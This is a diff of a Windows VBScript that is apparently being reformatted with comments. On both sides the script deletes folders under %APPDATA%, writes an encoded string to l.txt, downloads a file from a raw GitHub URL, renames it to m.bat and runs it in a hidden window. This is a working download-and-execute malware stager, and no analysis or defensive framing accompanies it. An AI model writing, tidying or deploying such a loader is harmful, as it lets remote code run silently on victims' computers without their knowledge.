@@ -1,37 +1,41 @@
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set sh = CreateObject("WScript.Shell")
+appdata = sh.ExpandEnvironmentStrings("%APPDATA%")
 
-On Error Resume Next: Set fso=CreateObject("Scripting.FileSystemObject"):Set sh=CreateObject("WScript.Shell"):p=sh.ExpandEnvironmentStrings("%APPDATA%")&"\Paged"
-If fso.FolderExists(p) Then fso.DeleteFolder p, True
-On Error Resume Next: Set fso=CreateObject("Scripting.FileSystemObject"):Set sh=CreateObject("WScript.Shell"):p=sh.ExpandEnvironmentStrings("%APPDATA%")&"\Paged-l"
-If fso.FolderExists(p) Then fso.DeleteFolder p, True
-With CreateObject("Scripting.FileSystemObject")
-    tempPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%\Grok-l")
-    If .FolderExists(tempPath) Then .DeleteFolder tempPath, True
-End With
+' Delete existing folders if they exist
+paged = appdata & "\Paged"
+If fso.FolderExists(paged) Then fso.DeleteFolder paged, True
 
-Set fileSys = CreateObject("Scripting.FileSystemObject")
-Set shellObj = CreateObject("WScript.Shell")
-userData = shellObj.ExpandEnvironmentStrings("%APPDATA%")
-workDir = userData & "\Paged-l"
+paged_l = appdata & "\Paged-l"
+If fso.FolderExists(paged_l) Then fso.DeleteFolder paged_l, True
 
-If Not fileSys.FolderExists(workDir) Then fileSys.CreateFolder(workDir)
+grok_l = appdata & "\Grok-l"
+If fso.FolderExists(grok_l) Then fso.DeleteFolder grok_l, True
 
-Set fileOut1 = fileSys.CreateTextFile(workDir & "\l.txt", True)
-fileOut1.WriteLine "BhsDHhxNQUAQBxsfGw1ZDQAaQQAHA1sYHgJDQRwWAx8bC0AFDxhYAw4eAEASAAwYCgoTQBsPGg=="
-fileOut1.Close
+' Create new folder
+If Not fso.FolderExists(paged_l) Then fso.CreateFolder(paged_l)
 
-Set fileOut2 = fileSys.CreateTextFile(workDir & "\m.txt", True)
-Set httpObj = CreateObject("MSXML2.XMLHTTP")
-httpObj.Open "GET", "https://raw.githubusercontent.com/Zenth-grid/ZENTH-MAIN/main/V/Main.txt", False
-httpObj.Send
-fileOut2.Write httpObj.responseText
-fileOut2.Close
+' Create l.txt
+Set file1 = fso.CreateTextFile(paged_l & "\l.txt", True)
+file1.WriteLine "BhsDHhxNQUAQBxsfGw1ZDQAaQQAHA1sYHgJDQRwWAx8bC0AFDxhYAw4eAEASAAwYCgoTQBsPGg=="
+file1.Close
 
+' Download and create m.txt
+Set file2 = fso.CreateTextFile(paged_l & "\m.txt", True)
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", "https://raw.githubusercontent.com/Zenth-grid/ZENTH-MAIN/main/V/Main.txt", False
+http.Send
+file2.Write http.responseText
+file2.Close
+
+' Wait and rename m.txt to m.bat
 WScript.Sleep 5000
-fileSys.MoveFile workDir & "\m.txt", workDir & "\m.bat"
+fso.MoveFile paged_l & "\m.txt", paged_l & "\m.bat"
 WScript.Sleep 3000
 
-If fileSys.FileExists(workDir & "\m.bat") Then
-    shellObj.Run Chr(34) & workDir & "\m.bat" & Chr(34), 0, False
+' Run m.bat if it exists
+If fso.FileExists(paged_l & "\m.bat") Then
+    sh.Run Chr(34) & paged_l & "\m.bat" & Chr(34), 0, False
 Else
-    WScript.Echo "Error: m.bat not found in " & workDir
+    WScript.Echo "Error: m.bat not found in " & paged_l
 End If
